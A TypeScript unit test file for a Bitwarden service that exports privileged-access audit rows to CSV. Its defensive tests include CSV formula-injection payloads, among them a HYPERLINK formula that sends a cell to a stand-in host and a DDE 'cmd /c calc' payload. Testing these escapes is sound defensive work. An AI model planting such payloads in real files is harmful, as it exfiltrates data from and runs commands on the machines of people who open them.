import { TestBed } from "@angular/core/testing";
import * as papa from "papaparse";

import { I18nService } from "@bitwarden/common/platform/abstractions/i18n.service";
import { I18nMockService } from "@bitwarden/components";

import { AuditRow } from "./access-audit-row";
import { AuditExportService } from "./audit-export.service";

function row(overrides: Partial<AuditRow> = {}): AuditRow {
  return {
    occurredAt: new Date("2026-06-30T12:00:00Z"),
    kindLabelKey: "pamAuditKindLeaseActivated",
    actor: "Ada Lovelace",
    actorId: "user-ada",
    actorEmail: "ada@example.com",
    requester: "Grace Hopper",
    requesterId: "user-grace",
    requesterEmail: "grace@example.com",
    cipherName: "prod db",
    collectionName: "production",
    ruleName: "Production access",
    detail: "Approved for the incident window.",
    automated: false,
    inDoubt: false,
    requestId: "req-1",
    duration: { key: "pamInboxDurationHours", value: 4 },
    exactWindow: "6/30/26, 12:00 – 6/30/26, 16:00",
    extendedUntil: null,
    searchText: "ada lovelace grace hopper prod db production",
    ...overrides,
  };
}

describe("AuditExportService", () => {
  let service: AuditExportService;

  beforeEach(() => {
    TestBed.configureTestingModule({
      providers: [
        {
          provide: I18nService,
          useValue: new I18nMockService({
            pamAuditKindLeaseActivated: "Lease activated",
            pamAuditKindRuleCreated: "Access rule created",
            pamAuditKindLeaseExtended: "Lease extended",
            pamInboxDurationHours: "__$1__ hours",
            pamInboxDuration1Hour: "1 hour",
          }),
        },
      ],
    });
    service = TestBed.inject(AuditExportService);
  });

  describe("toAuditExport", () => {
    it("maps a fully populated row onto the column contract", () => {
      expect(service.toAuditExport(row())).toEqual({
        timestamp: "2026-06-30T12:00:00.000Z",
        event: "Lease activated",
        actorName: "Ada Lovelace",
        actorEmail: "ada@example.com",
        requesterName: "Grace Hopper",
        requesterEmail: "grace@example.com",
        itemName: "prod db",
        collectionName: "production",
        ruleName: "Production access",
        grantedDuration: "4 hours",
        extendedUntil: "",
        detail: "Approved for the incident window.",
        automated: false,
        incomplete: false,
        requestId: "req-1",
      });
    });

    // The file outlives the session that produced it, so the instant is written in full rather than in the
    // exporter's own zone the way the Time column renders it.
    it("writes the timestamp as a full ISO 8601 instant", () => {
      const exported = service.toAuditExport(
        row({ occurredAt: new Date("2026-01-05T23:30:15.250Z") }),
      );

      expect(exported.timestamp).toBe("2026-01-05T23:30:15.250Z");
    });

    it("renders every absent value as an empty cell", () => {
      const exported = service.toAuditExport(
        row({
          kindLabelKey: "pamAuditKindRuleCreated",
          actor: null,
          actorId: null,
          actorEmail: null,
          requester: null,
          requesterId: null,
          requesterEmail: null,
          cipherName: null,
          collectionName: null,
          ruleName: null,
          detail: null,
          requestId: null,
          duration: null,
          exactWindow: null,
          extendedUntil: null,
          automated: true,
          inDoubt: true,
        }),
      );

      expect(exported).toEqual({
        timestamp: "2026-06-30T12:00:00.000Z",
        event: "Access rule created",
        actorName: "",
        actorEmail: "",
        requesterName: "",
        requesterEmail: "",
        itemName: "",
        collectionName: "",
        ruleName: "",
        grantedDuration: "",
        extendedUntil: "",
        detail: "",
        automated: true,
        incomplete: true,
        requestId: "",
      });
      expect(JSON.stringify(exported)).not.toMatch(/null|undefined/);
    });

    // Cipher and collection names come from local vault state, so an item the exporter cannot decrypt has
    // none. The empty cell is the correct answer: the response's encrypted names are not a fallback.
    it("leaves the item empty for a row whose item did not resolve", () => {
      const exported = service.toAuditExport(row({ cipherName: null, collectionName: null }));

      expect(exported.itemName).toBe("");
      expect(exported.collectionName).toBe("");
      expect(exported.ruleName).toBe("Production access");
    });

    it("localizes a duration that takes no substitution", () => {
      const exported = service.toAuditExport(
        row({ duration: { key: "pamInboxDuration1Hour", value: null } }),
      );

      expect(exported.grantedDuration).toBe("1 hour");
    });

    // A LeaseExtended event carries no granted window, so without its own column the one datum the event
    // exists to record would not reach the file at all.
    it("writes the new lease end for an extension, which carries no duration", () => {
      const exported = service.toAuditExport(
        row({
          kindLabelKey: "pamAuditKindLeaseExtended",
          duration: null,
          exactWindow: null,
          extendedUntil: "2026-07-01T18:30:00.000Z",
        }),
      );

      expect(exported.grantedDuration).toBe("");
      expect(exported.extendedUntil).toBe("2026-07-01T18:30:00.000Z");
    });
  });

  describe("getAuditExport", () => {
    it("writes one record per row, in the order given", () => {
      const csv = service.getAuditExport([
        row({ detail: "first" }),
        row({ detail: "second" }),
        row({ detail: "third" }),
      ]);

      const parsed = papa.parse<Record<string, string>>(csv, { header: true });
      expect(parsed.data.map((record) => record.detail)).toEqual(["first", "second", "third"]);
    });

    // Approver comments are free text: a comment carrying the delimiter, a quote or a line break has to
    // survive the round trip rather than shift every later column.
    it("quotes a detail containing a comma, a double quote and a newline", () => {
      const detail = 'Approved, but "read-only"\nper the incident notes';

      const parsed = papa.parse<Record<string, string>>(service.getAuditExport([row({ detail })]), {
        header: true,
      });

      expect(parsed.data).toHaveLength(1);
      expect(parsed.data[0].detail).toBe(detail);
      expect(parsed.data[0].event).toBe("Lease activated");
    });

    // A denial reason is free text written by someone other than the auditor who opens the file. Left
    // as it was typed, a leading trigger makes the cell a formula the spreadsheet runs on open — the
    // usual shape being a HYPERLINK that carries a neighbouring cell off to another host.
    it.each([
      ["=", '=HYPERLINK("http://example.test/"&A1,"click")'],
      ["+", "+1+1"],
      ["-", "-1+1"],
      ["@", '@SUM(1,1)*cmd|" /c calc"!A0'],
      ["a leading tab", "\t=1+1"],
      ["a leading carriage return", "\r=1+1"],
    ])("neutralizes a detail opening with %s", (_trigger, detail) => {
      const parsed = papa.parse<Record<string, string>>(service.getAuditExport([row({ detail })]), {
        header: true,
      });

      expect(parsed.data[0].detail).toBe(`'${detail}`);
    });

    // The escape is an escape, not a redaction: the auditor has to read the comment that was left.
    it("keeps the original text behind the escape", () => {
      const detail = "=1+1";

      const exported = service.toAuditExport(row({ detail }));

      expect(exported.detail.slice(1)).toBe(detail);
    });

    // Every cell an auditor did not choose is a candidate, not just the free-text one.
    it("neutralizes a name a member set on themselves", () => {
      const parsed = papa.parse<Record<string, string>>(
        service.getAuditExport([row({ actor: "=1+1", cipherName: "@SUM(1,1)" })]),
        { header: true },
      );

      expect(parsed.data[0].actorName).toBe("'=1+1");
      expect(parsed.data[0].itemName).toBe("'@SUM(1,1)");
    });

    // An ordinary value must reach the file unchanged, or every cell an auditor reads carries a mark
    // that was never in the record.
    it("writes an ordinary value through untouched", () => {
      const parsed = papa.parse<Record<string, string>>(service.getAuditExport([row()]), {
        header: true,
      });

      expect(parsed.data[0].detail).toBe("Approved for the incident window.");
      expect(parsed.data[0].actorName).toBe("Ada Lovelace");
      expect(parsed.data[0].timestamp).toBe("2026-06-30T12:00:00.000Z");
    });

    it("names the file with a PAM-specific prefix and a csv extension", () => {
      expect(service.getFileName()).toMatch(/^bitwarden_pam_audit_export_\d{14}\.csv$/);
    });
  });
});
